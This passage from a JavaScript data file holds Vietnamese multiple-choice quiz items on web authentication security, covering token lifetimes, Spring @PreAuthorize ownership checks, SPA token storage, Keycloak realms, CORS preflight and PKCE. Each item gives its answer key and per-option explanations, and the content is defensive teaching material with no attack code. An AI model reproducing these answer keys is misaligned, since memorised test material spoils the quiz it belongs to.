            "✓ Đúng — tách 2 loại rủi ro: access (thường gửi đi, dễ lộ, phải ngắn) và refresh (giữ kỹ, ít lưu thông, được dài). Silent refresh là chuẩn industry.",
            "Token vĩnh viễn = credential bị lộ 1 lần vĩnh viễn compromised. Không có cơ chế thu hồi tự nhiên — hoàn toàn anti-pattern.",
            "Per-user TTL = bề mặt cấu hình phình to không giới hạn + không có mô hình đe dọa nhất quán. Security policy theo threat model, không theo survey UX."
          ]
        },
        {
          level: "medium",
          scenario: "Code review LAAS: API list-task chỉ có @PreAuthorize(\"hasRole('USER')\") — mọi USER đọc được task của mọi người. Yêu cầu: user chỉ xem task mình (hoặc admin).",
          q: "Thiết kế authorization theo dữ liệu đúng?",
          options: [
            "Thêm if-else trong controller: if (!task.owner.equals(currentUser)) throw 403",
            "@PreAuthorize(\"hasRole('ADMIN') or @taskSecurity.isOwner(#id, authentication.name)\") — SpEL delegate check ownership qua bean",
            "Lọc ở query: WHERE owner = :currentUser — không cần annotation",
            "Chuyển toàn bộ sang ACL table phức tạp"
          ],
          answer: 1,
          explain: "SpEL + custom bean = khai báo policy tại method, logic check trong component test được. isOwner(taskId, username) query DB so khớp — policy nhìn thấy ngay ở annotation, implementation tái sử dụng.",
          why: [
            "Imperative if-else rải trong controller: không visible từ ngoài, dễ miss 1 endpoint, không test riêng policy. Annotation = policy as configuration.",
            "✓ Đúng — đúng tầng: declaration (annotation) tách execution (bean). Cùng pattern dùng lại mọi endpoint, audit policy = grep @PreAuthorize.",
            "Lọc query là CHIẾN LƯỢC đúng (defense in depth + hiệu năng) nhưng KHÔNG THAY THẾ method security: endpoint /tasks/{id} của người khác vẫn cần 403 rõ ràng, không phải 404 giả.",
            "ACL table là giải pháp cho mô hình permission phức tạp nhiều chiều — over-engineering cho rule 'owner hoặc admin'. Đơn giản trước, phức tạp khi cần."
          ]
        },
        {
          level: "hard",
          scenario: "SPA LAAS lưu access token trong localStorage. Báo cáo pentest: 1 dependency cũ có XSS — attacker đọc được toàn bộ token người dùng.",
          q: "Kiến trúc lưu token chuẩn cho SPA?",
          options: [
            "Encrypt token trước khi localStorage — attacker không đọc được",
            "Access token trong JS memory (biến mất khi refresh) + refresh token trong HttpOnly+Secure+SameSite=Strict cookie qua BFF/backend — XSS không chạm được refresh",
            "Chuyển sang sessionStorage — tự hết hạn khi đóng tab",
            "Lưu token trong IndexedDB với flag encrypted=true"
          ],
          answer: 1,
                   explain: "Memory mất khi refresh trang — nhưng refresh flow (cookie HttpOnly) tự động lấy lại access mới. XSS đọc được memory ĐANG sống nhưng không đọc được cookie HttpOnly (chỉ browser tự gửi) — thiệt hại giới hạn trong phiên.",
          why: [
            "Encrypt bằng key nào? Key cũng phải lưu đâu đó trong browser — attacker có XSS đọc được key và ciphertext cùng lúc. Mã hóa client-side tự quản là ảo tưởng.",
            "✓ Đúng — BFF (Backend for Frontend) pattern: cookie HttpOnly immune XSS (JS không đọc được), SameSite=Strict chặn CSRF, server-side session có thể revoke. Chuẩn OAuth for SPA hiện đại.",
            "sessionStorage vẫn JS-readable — XSS đọc như thường. Chỉ khác lifetime (tab), không khác security model.",
            "IndexedDB vẫn là browser storage JS truy cập được — flag encrypted không phải cơ chế, là câu thần chú."
          ]
        },
        {
          level: "medium",
          scenario: "Keycloak realm LAAS: ops hỏi 'realm là gì? Sao không dùng 1 realm chung cho mọi môi trường dev/sit/prod cho gọn?'",
          q: "Realm tách biệt mua lại lợi ích gì?",
          options: [
            "Chỉ là tên gọi — 1 realm chung cũng chẳng sao",
            "Cô lập hoàn toàn users/clients/roles/keys — môi trường nào cũng tự chủ,rò rỉ prod key không lan sang dev, test user không dính prod data",
            "Tăng hiệu năng Keycloak — mỗi realm 1 thread pool",
            "Realm là bắt buộc kỹ thuật của OAuth2"
          ],
          answer: 1,
          explain: "Realm = tenant boundary: users, sessions, keys, identity providers, policies. Dev realm bị XSS thử nghiệm không đe dọa prod. Rotation key prod không làm vỡ dev. Chính là 'blast radius containment' — cùng tư duy tách VPC/network.",
          why: [
            "1 realm chung = mọi môi trường chia sẻ: user test vô tình có quyền thật, key rotate prod làm đứt dev, brute force lab khóa tài khoản prod. Môi trường phải cách ly.",
            "✓ Đúng — cùng nguyên lý schema-per-environment: độc lập vận hành, độc lập an toàn, độc lập vòng đời. Chi phí (setup realm mới) nhỏ so rủi ro chia sẻ.",
            "Realm không phải unit phân bổ tài nguyên — Keycloak multi-realm trên cùng JVM. Lý do là isolation logic không phải performance.",
            "OAuth2/OIDC spec không biết khái niệm realm — đó là concept Keycloak (và các IdP khác) thêm cho multi-tenancy."
          ]
        },
        {
          level: "hard",
          scenario: "Frontend React gửi request POST /api/v1/payments lên Spring Boot kèm token Authorization. Trình duyệt tự động bắn trước một request OPTIONS (Preflight) và lập tức bị trả về lỗi 401 Unauthorized, làm toàn bộ tính năng thanh toán tê liệt.",
          q: "Nguyên nhân vì sao và cấu hình nào trong Spring Security 6 khắc phục triệt để?",
          options: [
            "Do CORS được cấu hình trong WebMvcConfigurer thay vì Spring Security; Security FilterChain chặn trước và từ chối request OPTIONS không có token. Khắc phục: Dùng http.cors() trong SecurityFilterChain và permitAll cho HttpMethod.OPTIONS",
            "Cần cấu hình frontend gửi kèm Authorization Bearer header ngay trong request OPTIONS của trình duyệt",
            "Cần tắt chế độ HTTPS và chuyển toàn bộ sang HTTP để trình duyệt không kích hoạt Preflight",
            "Cần thêm header Access-Control-Allow-Origin: * trong file application.yml"
          ],
          answer: 0,
          explain: "Preflight OPTIONS do trình duyệt tự động gửi và KHÔNG BAO GIỜ mang theo Authorization header. Nếu cấu hình CORS ở tầng WebMvc thay vì SecurityFilterChain, Spring Security chạy trước sẽ chặn request OPTIONS với lỗi 401. Khắc phục: cấu hình CorsConfigurationSource trực tiếp trong SecurityFilterChain và cho phép HttpMethod.OPTIONS permitAll.",
          why: [
            "✓ Đúng — FilterChainProxy chạy trước DispatcherServlet. Phải xử lý CORS ở Security FilterChain và permitAll request OPTIONS.",
            "Trình duyệt cấm can thiệp header vào request Preflight tự động — frontend không thể tự đính kèm Authorization header.",
            "HTTP không thay đổi Same-Origin Policy — khác domain vẫn bắn Preflight như thường, lại mất an toàn SSL.",
            "allowedOrigins(*) không giải quyết vấn đề xác thực 401 ở Security FilterChain, lại vi phạm khi allowCredentials=true."
          ]
        },
        {
          level: "hard",
          scenario: "Trong cuộc tấn công vào ứng dụng di động, tin tặc tạo một ứng dụng giả mạo đăng ký cùng Custom URL Scheme để đánh chặn mã ủy quyền Authorization Code. Theo chuẩn an ninh OAuth 2.1 BCP mới nhất, cơ chế nào bắt buộc phải áp dụng để ngăn chặn triệt để cuộc tấn công này?",
          q: "Cơ chế bảo vệ bắt buộc và nguyên lý hoạt động?",
          options: [
            "Chuyển sang dùng Implicit Flow để token trả về trực tiếp không cần authorization code",
            "PKCE (Proof Key for Code Exchange) với S256: client sinh ngẫu nhiên code_verifier và chỉ gửi code_challenge khi authorize; tin tặc dù chặn được code cũng không có code_verifier để đổi token",
            "Tăng độ dài của Authorization Code lên 1024 ký tự để không thể đoán mò",
            "Mã hóa Authorization Code bằng thuật toán đối xứng DES"
          ],
          answer: 1,
          explain: "PKCE (RFC 7636) bắt buộc trong OAuth 2.1 cho toàn bộ Mobile và SPA. Client giữ bí mật code_verifier trong RAM và chỉ gửi SHA-256 hash (code_challenge) cho server. Kẻ trộm đánh chặn được mã code trên hệ điều hành nhưng không có code_verifier nguyên bản thì không thể hoàn tất bước đổi token tại Token Endpoint.",
          why: [
            "Implicit Flow đã bị OAuth 2.1 khai tử vì trả token trực tiếp qua URL fragment còn nguy hiểm hơn gấp nhiều lần.",
            "✓ Đúng — PKCE ràng buộc mã ủy quyền với bí mật mật mã động code_verifier chỉ có client hợp lệ nắm giữ. Chặn đứng hoàn toàn Code Interception Attack.",
            "Độ dài mã code không giải quyết được việc bị ứng dụng giả mạo 'nghe trộm' trên hệ điều hành.",
            "DES là thuật toán mã hóa lỗi thời đã bị bẻ gãy từ lâu và không giải quyết được bài toán phân phối khóa trên client công khai."
          ]
        }
      ]
    }
  ]
});
